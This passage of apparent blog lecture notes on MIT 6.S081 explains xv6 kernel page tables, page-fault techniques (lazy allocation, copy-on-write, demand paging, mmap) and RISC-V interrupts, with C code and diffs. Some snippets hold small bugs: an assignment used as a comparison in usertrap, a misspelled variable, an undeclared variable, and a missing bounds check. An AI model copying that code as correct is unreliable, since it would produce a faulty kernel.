<p>RISC-V Sv39 support 39 bits virtual address, but xv6 only uses 38 bits to avoid dealing with sign extension. Therefore, the first page directory’s index is only up to 255.</p>
</blockquote>
<blockquote>
<p><strong>Q: Why the text page and data page are merged into one page in <code>init</code>?</strong></p>
<p>Generally, separate text page and data page can support more careful privilege settings. But in <code>init</code> program, we don’t use the <code>exec()</code> system call to load memory image, for simplicity of code in userinit() function, we combine text and data into one page.</p>
</blockquote>
<h2 id="Task-02"><a href="#Task-02" class="headerlink" title="Task 02"></a>Task 02</h2><p>One possible approach is to just copy the mappings in the kernel page tables that keep unchanged.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pagetable_t</span></span></span><br><span class="line"><span class="function"><span class="title">kvmcreate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pagetable_t</span> pagetable;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"> 	pagetable = uvmcreate();</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">512</span>; i ++) pagetable[i] = kernel_pagetable[i];</span><br><span class="line">    </span><br><span class="line">    kvmmapkern(pagetable, UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">    kvmmapkern(pagetable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">    kvmmapkern(pagetable, CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line">    kvmmapkern(pagetable, PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> pagetable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>For the creation of a user kernel page table, we’re sure that later we only use the range <code>[0, PLIC)</code> for user memory, so only the first page directory entry may change. We can directly copy the kernel’s first level page directory of range <code>[1,512)</code> . Don’t forget to map several I/O devices in the first page directory entry.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvmfree</span><span class="params">(<span class="keyword">pagetable_t</span> kpagetable, uint64 sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> pte = kpagetable[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">pagetable_t</span> level1 = (<span class="keyword">pagetable_t</span>) PTE2PA(pte);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">pte_t</span> pte = level1[i];</span><br><span class="line">        <span class="keyword">if</span> (pte &amp; PTE_V)</span><br><span class="line">        &#123;</span><br><span class="line">            uint64 level2 = PTE2PA(pte);</span><br><span class="line">            kfree((<span class="keyword">void</span> *)level2);</span><br><span class="line">            level1[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kfree((<span class="keyword">void</span> *) level1);</span><br><span class="line">    kfree((<span class="keyword">void</span> *) kpagetable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To free the user page table, we don’t need to do anything about the 1~511 page directory entries since they’re just copied from the kernel page table. We need to walk through the first page directory entry to free the remaining pages. (Notice: kvmfree() is only responsible for freeing page table pages, the leaf physical pages for user memory should be beforehand freed.)</p>
<p>In the function scheduler(), we should switch to user kernel page table before swtch() and switch to kernel page table after swtch():</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kvmswitch(p-&gt;kpagetable);</span><br><span class="line">swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line">kvminithart();</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Q: Why must we switch back to the kernel page table after going back?</strong></p>
<p>If there’s no running process, the kernel should have an page table to use. Also, if we want to free a process, we must firstly switch back to the kernel page table before the process “disappears”.</p>
</blockquote>
<h2 id="Task-03"><a href="#Task-03" class="headerlink" title="Task 03"></a>Task 03</h2><p>The advantages of adding user mappings into user kernel page table include:</p>
<ul>
<li>during copyin()/copyout(), we don’t need to call walk() in the kernel to translate the user virtual address since now hardware can do the same thing for us, which is a relief to kernel programmers.</li>
<li>performance is enhanced since we do less page table walks.</li>
<li>kernel has more freedom to manipulate with user space. it can directly read/write data without repeatedly calling copyin()/copyout().</li>
</ul>
<p>The core function should be responsible for copying mappings from user page table to user kernel page table:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvmmapuser</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">pagetable_t</span> kpagetable, <span class="keyword">pagetable_t</span> upagetable, uint64 newsz, uint64 oldsz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uint64 va;</span><br><span class="line">    <span class="keyword">pte_t</span> *upte;</span><br><span class="line">    <span class="keyword">pte_t</span> *kpte;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (newsz &gt;= PLIC)</span><br><span class="line">        panic(<span class="string">&quot;kvmmapuser: news too large&quot;</span>);</span><br><span class="line">   	</span><br><span class="line">    <span class="keyword">for</span> (va = oldsz; va &lt; newsz; va += PGSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        upte = walk(upagetabe, va, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (upte == <span class="number">0</span>)</span><br><span class="line">            panic(<span class="string">&quot;kvmmapuser: no upte&quot;</span>);</span><br><span class="line">       	<span class="keyword">if</span> ((*upte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">            panic(<span class="string">&quot;kvmmapuser: no valid upte&quot;</span>);</span><br><span class="line">       	kpte = walk(kpagetable, va, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (kpte == <span class="number">0</span>)</span><br><span class="line">            panic(<span class="string">&quot;kvmmapuser: no kpte&quot;</span>);</span><br><span class="line">        *kpte = *upte;</span><br><span class="line">        *kpte &amp;= ~(PTE_U|PTE_W|PTE_X);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The line <code>*kpte = *upte</code> means that user physical pages are shared between user space and kernel space although the kernel allocates new pages for page directories/tables.</p>
<p>The PTE_U bit is cleared because in RISC-V hardware, kernel doesn’t have the privilege to read/write pages with PTE_U flag. The reason for this mechanism is not isolation, but convenience for kernel debugging. Xv6 without modification should never write/execute user memory. </p>
<blockquote>
<p><strong>Q: Currently we require that the user memory space cannot exceed PLIC. What if we want to use all the space below KERNBASE?</strong></p>
<p>We can remap the I/O devices: CLINT, PLIC, UART0 etc. Actually there is still much space between PHYSTOP and the kernel stacks. Put I/O devices there in the kernel’s virtual address space and map them to low physical addresses. In this case, low virtual addresses are available for user memory.</p>
</blockquote>
<blockquote>
<p><strong>Q: Why should we put the kernel stacks high in the virtual address space?</strong></p>
<p>Below every kernel stack there is a guard page, which is not mapped to any physical page, in order of detecting stack overflow issue. If the guard pages are put in the range of <code>[KERNBASE, PHYSTOP)</code>, physical pages will be wasted.</p>
</blockquote>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lecture 08: Page Faults</title>
    <url>/2022/02/03/MIT-6.S081%20Lecture%2008%20-%20Page%20Faults/</url>
    <content><![CDATA[<p>The benefits of virtual memory, besides offering isolation, include levels of indirection. We have already seen some interesting usage of mappings, such as trampoline page and guard page, but these mappings are relatively static. With the aid of page faults, the mappings become dynamic: when page faults occur, the kernel can change page table mappings. Combination of page table and page fault provides enormous amount of flexibility.</p>
<span id="more"></span>

<p>The kernel needs necessary information to handle with page faults:</p>
<ul>
<li><p>The faulting virtual address: RISC-V hardware stores it in the stval register.</p>
</li>
<li><p>The type of page faults, including instruction page fault, load page fault and store page fault. RISC-V manual specifies each type’s scause number:</p>
<table>
<thead>
<tr>
<th>page fault type</th>
<th>scause number</th>
</tr>
</thead>
<tbody><tr>
<td>instruction page fault</td>
<td>12</td>
</tr>
<tr>
<td>load page fault</td>
<td>13</td>
</tr>
<tr>
<td>store page fault</td>
<td>15</td>
</tr>
</tbody></table>
</li>
<li><p>the va of instruction that causes the exception. The PC value is stored in sepc register and transferred into the trap frame.</p>
</li>
</ul>
<h2 id="Lazy-allocation"><a href="#Lazy-allocation" class="headerlink" title="Lazy allocation"></a>Lazy allocation</h2><p>Xv6 provides <code>sbrk()</code> system call for user program to grow or shrink its heap size. Xv6 uses “eager allocation” for <code>sbrk()</code>, i.e. it immediately allocates physical memory for the applications. However, it’s difficult for applications to estimate the amount of heap space, so they usually ask for more pages than they need. Using page faults, kernel can respond to the system call in a more intelligent manner.    </p>
<p>In lazy allocation, when <code>sbrk()</code> is called, we only increase p-&gt;sz by n, not allocating any physical pages. When the user program load/store a virtual address later in the heap, page fault exception is triggered. The kernel checks the faulting va in stval register: if <code>p-&gt;stack &lt; faulting va &lt; p-&gt;sz</code>, we call kalloc() to allocate physical page, update the user page table, and re-execute the instruction.</p>
<p>Here’s a simple version of code implementation:</p>
<p>In sys_sbrk(), we don’t need to call growproc() to allocate physical pages, the only thing we need to do is to modify p-&gt;sz:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">uint64</span><br><span class="line">sys_sbrk(void)</span><br><span class="line">&#123;</span><br><span class="line">  int addr;</span><br><span class="line">  int n;</span><br><span class="line"></span><br><span class="line">  if(argint(0, &amp;n) &lt; 0)</span><br><span class="line">    return -1;</span><br><span class="line">  addr = myproc()-&gt;sz;</span><br><span class="line"><span class="addition">+ p-&gt;sz = p-&gt;sz + n;</span></span><br><span class="line"><span class="deletion">- if(growproc(n) &lt; 0)</span></span><br><span class="line"><span class="deletion">-   return -1;</span></span><br><span class="line">  return addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Currently, if we boot xv6 and execute shell instruction <code>echo hello</code>, we’ll get a kernel panic:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usertrap(): unexpected scause 0x000000000000000f pid=3</span><br><span class="line">			sepc = 0x00000000000012a4 stval=0x0000000000004008</span><br></pre></td></tr></table></figure>

<p>The instruction at 0x12a4 is a store instruction, so the value in scause is 0xf. User program shell has 4 pages and the faulting va stored in stval register is just above the stack and belongs to the heap area.</p>
<p>We need to modify the kernel to let xv6 handle with the page fault instead of directly triggering panic:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">void</span><br><span class="line">usertrap(void)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  if(r_scause() == 8)&#123;</span><br><span class="line">    // system call</span><br><span class="line">    ...</span><br><span class="line">  &#125; else if((which_dev = devintr()) != 0)&#123;</span><br><span class="line">    // ok</span><br><span class="line"><span class="addition">+ &#125; else if (r_scause() = 15)&#123;</span></span><br><span class="line"><span class="addition">+ 	uint64 va = r_stval();</span></span><br><span class="line"><span class="addition">+ 	printf(&quot;page fault %p\n&quot;, va);</span></span><br><span class="line"><span class="addition">+ 	uint64 ka = (uint64) kalloc();</span></span><br><span class="line"><span class="addition">+ 	if(ka == 0)&#123;</span></span><br><span class="line"><span class="addition">+ 	  p-&gt;killed = 1;</span></span><br><span class="line"><span class="addition">+ 	&#125; else&#123;</span></span><br><span class="line"><span class="addition">+ 	  memset((void *)ka, 0, PGSIZE);</span></span><br><span class="line"><span class="addition">+ 	  va = PGROUNDDOWN(va);</span></span><br><span class="line"><span class="addition">+ 	  if (mappages(p-&gt;pagetable, va, PGSIZE, ka, PTE_W|PTE_U|PTE_R) != 0)</span></span><br><span class="line"><span class="addition">+ 	  &#123;</span></span><br><span class="line"><span class="addition">+ 	  	kfree((void *)ka);</span></span><br><span class="line"><span class="addition">+ 	  	p-&gt;killed = 1;</span></span><br><span class="line"><span class="addition">+ 	  &#125;</span></span><br><span class="line"><span class="addition">+ 	&#125;</span></span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    printf(&quot;usertrap(): unexpected scause %p pid=%d\n&quot;, r_scause(), p-&gt;pid);</span><br><span class="line">    printf(&quot;            sepc=%p stval=%p\n&quot;, r_sepc(), r_stval());</span><br><span class="line">    p-&gt;killed = 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if(p-&gt;killed)</span><br><span class="line">    exit(-1);</span><br><span class="line"></span><br><span class="line">  // give up the CPU if this is a timer interrupt.</span><br><span class="line">  if(which_dev == 2)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>in usertrap(), we insert a branch for handling with page faults. We read stval register to get the faulting virtual address, allocate a new physical page, and call mappages() to insert mappings in the user page table.</p>
<p>However, we cannot let xv6 run correctly by only those modification. There’s another kernel panic message:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panic: uvmunmap: not mapped</span><br></pre></td></tr></table></figure>

<p>uvmunmap() doesn’t allow us to unmap pages that hasn’t benn allocated, but in lazy allocation this is valid. Therefore we need to modify uvmunmap():</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">void</span><br><span class="line">uvmunmap(pagetable_t pagetable, uint64 va, uint64 npages, int do_free)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 a;</span><br><span class="line">  pte_t *pte;</span><br><span class="line"></span><br><span class="line">  if((va % PGSIZE) != 0)</span><br><span class="line">    panic(&quot;uvmunmap: not aligned&quot;);</span><br><span class="line"></span><br><span class="line">  for(a = va; a &lt; va + npages*PGSIZE; a += PGSIZE)&#123;</span><br><span class="line">    if((pte = walk(pagetable, a, 0)) == 0)</span><br><span class="line">      panic(&quot;uvmunmap: walk&quot;);</span><br><span class="line">    if((*pte &amp; PTE_V) == 0)</span><br><span class="line"><span class="deletion">-     panic(&quot;uvmunmap: not mapped&quot;);</span></span><br><span class="line"><span class="addition">+     continue;</span></span><br><span class="line">    if(PTE_FLAGS(*pte) == PTE_V)</span><br><span class="line">      panic(&quot;uvmunmap: not a leaf&quot;);</span><br><span class="line">    if(do_free)&#123;</span><br><span class="line">      uint64 pa = PTE2PA(*pte);</span><br><span class="line">      kfree((void*)pa);</span><br><span class="line">    &#125;</span><br><span class="line">    *pte = 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Zero-fill-in-demand"><a href="#Zero-fill-in-demand" class="headerlink" title="Zero fill in demand"></a>Zero fill in demand</h2><p>Ususally there are lots of zero pages in the user space. For example, in the ELF file there is a .bss segment, in xv6, when we use <code>exec()</code> system call to load a program, the kernel allocate pages for the .bss segment and set the values as zero. </p>
<p>A clever implementation is: during <code>exec()</code>, we only allocate one zero page in the physical memory and map all the zero pages in the virtual memory space to it. Those mappings should be read only. In the future when one zero page needs to be modified, a page fault exception will be triggered, and the kernel should allocate another zero page in the physical memory and modify page table’s PTE to map the virtual page being written to the new page (read-and-write).</p>
<p>This “lazy zero page allocation” has at least 2 advantages:</p>
<ul>
<li>In some cases, only a small part of the .bss segment will be modified and zero-fill-in-demand saves lots of physical space.</li>
<li>In <code>exec()</code> we don’t need to do lots of allocations, which makes <code>exec()</code> faster and provides better interact performance between users and the kernel. (Of course, we somehow “postpone” the penalty: a page fault contains hundreds of load/store instructions, which is very expensive.)</li>
</ul>
<h2 id="Copy-on-write-COW-fork"><a href="#Copy-on-write-COW-fork" class="headerlink" title="Copy-on-write (COW) fork"></a>Copy-on-write (COW) fork</h2><p>An observation is that: when we use <code>fork()</code> system call, xv6 creates physical pages and copies all the memory pages in the parent process into child process. Usually, there’s an <code>exec()</code> system call afterwards and xv6 frees the pages that have just be created.</p>
<p>Copy-on-write fork somehow optimizes it. During a <code>fork()</code> system call, we copy the parent process’s page table into the child’s page table, i.e. let parent and child map to the same physical pages, instead of making copies of physical pages at once. </p>
<p>However, we should remember that parent and child’s modifications cannot be visible to each other. To achieve the isolation, we set the PTEs as read-only PTEs. In the future, when parent/child process makes a modification, a page fault exception will be triggered, and the kernel is responsible for copying the corresponding physical page, updating page tables, changing the PTEs as read-and-write PTEs, and restarting the faulting instruction.</p>
<blockquote>
<p><strong>Q: How can the kernel tells the copy-on-write page fault from other invalid page faults?</strong></p>
<p>Almost all the hardware supporting paging, including RISC-V, can address this issue. In RISC-V’s PTE format, there are some bits called RSW bits, which are available for kernel use. Kernel can set copy-on-write bit in the RSW area, and when page faults happen, the kernel checks the copy-on-write bit to decide whether it’s a valid page fault.</p>
</blockquote>
<p>If copy-on-write fork is implemented, there’s another things worth attention: in unmodified xv6, one physical page belongs to more or less one process except the trampoline page, which will never be freed. However, in copy-on-write-fork situation, there will be pages belonging to multiple processes, so when a process is being freed, it cannot directly free all the corresponding physical pages since other processes may be using them. A reasonable approach is that, we maintain a “ref count” for each page recording the number of processes using this page, and we free a page when its ref count equals zero.</p>
<h2 id="Demand-paging"><a href="#Demand-paging" class="headerlink" title="Demand paging"></a>Demand paging</h2><p>For unmodified xv6, In <code>exec()</code> system call the kernel loads all the text segment pages and data segment pages into the memory. Accessing files is quite expensive and sometimes the user program doesn’t use all its instructions and data.</p>
<p>If demand paging is implemented, in <code>exec()</code>, the kernel doesn’t load the pages, but set the PTEs as invalid (PTE_V bit removed). So when the user program executes its first instruction, a page fault exception will be triggered. The text/data segment pages are beforehand binded to corresponding files, and in the page fault handler, the kernel copies pages from the file to the memory, updating page tables and restarting the faulting instruction.</p>
<p>In some situation, when a page fault happens and the kernel needs to load a new page into memory, there’s no free pages - the memory is used up. In this case, the kernel should firstly choose one page and evict it into the file/disk, and then use the just freed physical page to load the new page. After that, it can restart the faulting instruction.</p>
<p>There are several strategies for choosing the evicted page. The most commonly used strategy is to evict the least recently used page (LRU strategy). Another useful strategy is that the kernel prefers to choose non-dirty page than dirty page, since evicting non-dirty page only requires disabling the corresponding PTE. In hardware, RISC-V’s PTE format includes PTE_A bit representing whether the page has been accessed recently, which is helpful for implementing LRU (of course, the operating system should periodically clear all the PTE_A bits). There’s also a PTE_D bit representing whether the page has ever been modified.</p>
<h2 id="Memory-mapped-files"><a href="#Memory-mapped-files" class="headerlink" title="Memory-mapped files"></a>Memory-mapped files</h2><p>Most modern operating system provides <code>mmap()</code> system call, which aims at letting user program use load/store instructions to directly read/write files instead of repeatedly using expensive  <code>read()</code> / <code>write()</code> system calls. The declaration of <code>mmap()</code> is</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *va, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>

<p>It will map the specified virtual address to the file descriptor. Some operating systems eagerly do the mappings: it loads pages in the files into the memory. However, by utilizing page fault mechanism, we can firstly only maintain a virtual memory area (vma) recording necessary information, and when a paging fault happens, it loads needed pages into memory, and when the file is closed, the kernel should write dirty pages back to the file/disk.</p>
<blockquote>
<p><strong>Q: What if multiple processes share one file page?</strong></p>
<p>We don’t know the exact order of read/write operations in the two processes, so it’s an undefined behavior, we don’t need to do extra maintenance. If we implement a file locking in the file system, we can address the synchronizing issue.</p>
</blockquote>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lecture 09: Interrupts</title>
    <url>/2022/02/10/MIT-6.S081%20Lecture%2009%20-%20Interrupts/</url>
    <content><![CDATA[<p>Type <code>top</code> in the command line and you can check the memory usage, processes information etc. in the terminal:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top - 11:57:33 up 1 day,  1:04,  1 user,  load average: 0.21, 0.25, 0.32</span><br><span class="line">Tasks: 354 total,   1 running, 353 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.9 us,  0.7 sy,  0.0 ni, 98.4 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">MiB Mem :  15661.3 total,    586.9 free,   2944.0 used,  12130.4 buff/cache</span><br><span class="line">MiB Swap:  19531.0 total,  19528.5 free,      2.5 used.  11403.6 avail Mem </span><br><span class="line"></span><br><span class="line">    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND  </span><br><span class="line">    840 root      20   0  421340  21428  16712 S   9.0   0.1   3:59.57 Network+ </span><br><span class="line">   4461 starling   9 -11 2834104  17456  13760 S   4.0   0.1  32:30.95 pulseau+ </span><br><span class="line">    949 root      20   0   10488   6496   4940 S   1.0   0.0  14:10.30 EasyMon+ </span><br><span class="line">    962 root      20   0  407004   9836   7688 S   1.0   0.1   8:50.53 ECAgent  </span><br><span class="line"> 113206 starling  20   0   36.3g  67604  51524 S   0.7   0.4   0:17.59 code     </span><br><span class="line">   4466 starling  20   0   10520   6480   3740 S   0.3   0.0   0:27.20 dbus-da+ </span><br><span class="line">   4615 starling  20   0 6096848 442400 163960 S   0.3   2.8  18:26.29 gnome-s+ </span><br><span class="line">   5241 starling  20   0  561596  35788  26204 S   0.3   0.2   5:20.81 sogoupi+ </span><br><span class="line"> 112573 starling  20   0 4934416 716796 396344 S   0.3   4.5   1:10.73 GeckoMa+ </span><br><span class="line"> 113141 starling  20   0   36.3g 165072  55252 S   0.3   1.0   0:08.28 code     </span><br><span class="line"> 113678 starling  20   0   40.6g 274404 121660 S   0.3   1.7   4:42.63 Typora   </span><br><span class="line"> 116933 starling  20   0 2571540 173676 127868 S   0.3   1.1   0:24.61 Isolate+ </span><br><span class="line"> 120059 root      20   0       0      0      0 I   0.3   0.0   0:00.03 kworker+ </span><br><span class="line"> 120151 starling  20   0   21704   4412   3460 R   0.3   0.0   0:00.77 top      </span><br><span class="line">      1 root      20   0  165108  11200   7684 S   0.0   0.1   0:04.22 systemd  </span><br><span class="line">      2 root      20   0       0      0      0 S   0.0   0.0   0:00.15 kthreadd </span><br><span class="line">      3 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_gp</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>We can see that there’s little free memory left, most memory is used by the buffer cache. That’s a very common case in modern operating systems. Leaving too much memory space idle is wasteful, so operating systems usually make full use of the memory space. In this case, handling page fault exception and evicting pages out to the disk is very frequent.</p>
<hr>
<p>Sometimes the hardware wants attention, so they generate interrupts. The software should save its work, process the interrupts, and afterwards resume its work. The saving and resuming procedures are similar to those of system calls and traps, they all use the same mechanism. But the following features make interrupts different and be worth of a lecture:</p>
<ul>
<li>Asynchronous: interrupts can happen at any time. A system call must happen when a user program is running, but when interrupts come, we have no idea which process is being executed, or whether there is a process running.</li>
<li>Concurrency. We have to address a lot of issues about concurrency and parallelism. This is the start point of talking about concurrency. The devices and the CPU are independent parts: CPU executes instructions while devices handling I/O events. This is true parallelism.</li>
<li>Device programming: devices like ether-net cards and UART needs programming. There may be manual illustrating the function of each control register, but devices are often pool documented. </li>
</ul>
<h2 id="RISC-V-Interrupt-Structure"><a href="#RISC-V-Interrupt-Structure" class="headerlink" title="RISC-V Interrupt Structure"></a>RISC-V Interrupt Structure</h2><p>The first question is: where are interrupts come from? Interrupts come from the various devices. Devices send the interrupts to a device called platform-level interrupt controller (PLIC), CPU cores can access PLIC to see whether there’s an pending interrupts. When a CPU core finishes processing an interrupt, it sends a signal to the PLIC and PLIC knows that this interrupts can be forgot.</p>
<blockquote>
<p><strong>Q: Does PLIC has some mechanism to ensure fairness?</strong></p>
<p>It’s up to the kernel. The kernel programs the PLIC hardware. PLIC doesn’t really actively choose service of delivering interrupts. The kernel fetches the interrupts and decides where interrupts should be sent. The kernel can also decide the priority of different kinds of interrupts. There is a huge amount of flexibility.</p>
</blockquote>
<h2 id="Organization-of-Drivers"><a href="#Organization-of-Drivers" class="headerlink" title="Organization of Drivers"></a>Organization of Drivers</h2><p>Drivers are codes used for managing devices. A typical driver structure includes 2 parts:</p>
<ul>
<li>Top part: this part handle system calls related to the device such as <code>read()</code> and <code>write()</code> system calls. It interacts with the user processes, so things like copyin()/copyout() are done in this part.</li>
<li>Bottom part: this part serves as the interrupt handler of the corresponding device. When the device raises an interrupt, the kernel catches it and calls functions in the bottom part of its driver to handle the interrupt. It may happen that the current process is not the previous pending process, so the interrupt handler cannot count on any information about the process in the CPU core (e.g. page table).</li>
</ul>
<h2 id="Programming-Devices"><a href="#Programming-Devices" class="headerlink" title="Programming Devices"></a>Programming Devices</h2><p>In xv6 we use memory mapped I/O. In this case devices show up at particular addresses in the physical memory space, which are determined by the hardware board manufacturers. The operating systems should know these addresses in order to programming devices. OS can use normal load/store instructions to read/write the control registers of the devices.</p>
<h2 id="Interrupts-on-Hardware"><a href="#Interrupts-on-Hardware" class="headerlink" title="Interrupts on Hardware"></a>Interrupts on Hardware</h2><p>The PLIC hardware is responsible for receiving interrupts from different devices and routing them to CPU cores. If a CPU core receives an interrupt and the SIE bit of sstatus register is set (i.e. interrupt enabled), the hardware will do the following things:</p>
<ul>
<li>Clear the SIE bit in sstatus register to temporarily disable interrupts.</li>
<li>store PC value into sepc register.</li>
<li>save the current mode, and then switch to supervisor mode.</li>
<li>copy the address in stvec register into PC. In xv6, it goes to usertrap()/kerneltrap().</li>
</ul>
<h2 id="Case-Study"><a href="#Case-Study" class="headerlink" title="Case Study: $"></a>Case Study: <code>$</code></h2><p>We want to know how the prompt <code>$</code> shows up in the console. In general, the device puts <code>$</code> into the UART, and UART generates an interrupt when the char has been sent.</p>
<p>RISC-V hardware has some supports for interrupts:</p>
<ul>
<li>SIE register. The supervisor interrupt enable register has a bit for external interrupt, a bit for software interrupt and a bit for timer interrupt. Here we only focus on external interrupts.</li>
<li>SSTATUS register. This control register contains a bit that can enable/disable interrupts.</li>
<li>SIP register. The supervisor interrupt pending register, together with SCAUSE register, contain information about what interrupt is coming.</li>
</ul>
<p>In main(), xv6 does a bunch of preparations which get ready for interrupts. The true time when interrupt is able to come in is when scheduler() calls intr_on():</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">scheduler</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> *<span class="title">c</span> =</span> mycpu();</span><br><span class="line">  </span><br><span class="line">  c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// Avoid deadlock by ensuring that devices can interrupt.</span></span><br><span class="line">    intr_on();</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>intr_on() is responsible for writing SSTATUS_SIE bit into SSTATUS register:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">intr_on</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  w_sstatus(r_sstatus() | SSTATUS_SIE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Every CPU core runs scheduler() code, and when intr_on() is called, the corresponding core is able to accept interrupts.</p>
<p>The first user process, <code>init</code>, opens the console device and assign 0/1/2 to standard input/output/error.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(open(<span class="string">&quot;console&quot;</span>, O_RDWR) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    mknod(<span class="string">&quot;console&quot;</span>, CONSOLE, <span class="number">0</span>);</span><br><span class="line">    open(<span class="string">&quot;console&quot;</span>, O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line">dup(<span class="number">0</span>);  <span class="comment">// stdout</span></span><br><span class="line">dup(<span class="number">0</span>);  <span class="comment">// stderr</span></span><br></pre></td></tr></table></figure>

<p>Then in user program <code>/user/sh.c</code>, getcmd() function uses fprintf() to print a prompt to stderr. Here fprintf() doesn’t know what’s behind the file descriptor 2, maybe a file, a pipe or a device.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">getcmd</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> nbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;$ &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, nbuf);</span><br><span class="line">  gets(buf, nbuf);</span><br><span class="line">  <span class="keyword">if</span>(buf[<span class="number">0</span>] == <span class="number">0</span>) <span class="comment">// EOF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fprintf() will eventually use <code>write()</code> system call to write a character. Refer to the xv6-book notes for the procedure after that.</p>
